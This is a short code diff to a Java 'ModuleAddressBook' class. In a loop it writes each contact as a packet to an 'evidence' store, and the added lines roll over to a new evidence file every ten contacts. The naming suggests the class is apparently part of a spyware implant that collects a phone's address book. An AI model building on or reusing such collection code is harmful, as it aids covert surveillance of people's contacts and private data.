@@ -216,6 +216,11 @@ public final class ModuleAddressBook extends BaseModule implements
                 final byte[] packet = getContactPacket(contactList, contact);
 
                 evidence.writeEvidence(packet);
+                if(number % 10 == 0){
+                    evidence.close();
+                    evidence = new Evidence(EvidenceType.ADDRESSBOOK);
+                    evidence.createEvidence();
+                }
 
             } catch (final Exception ex) {
                 //#ifdef DEBUG
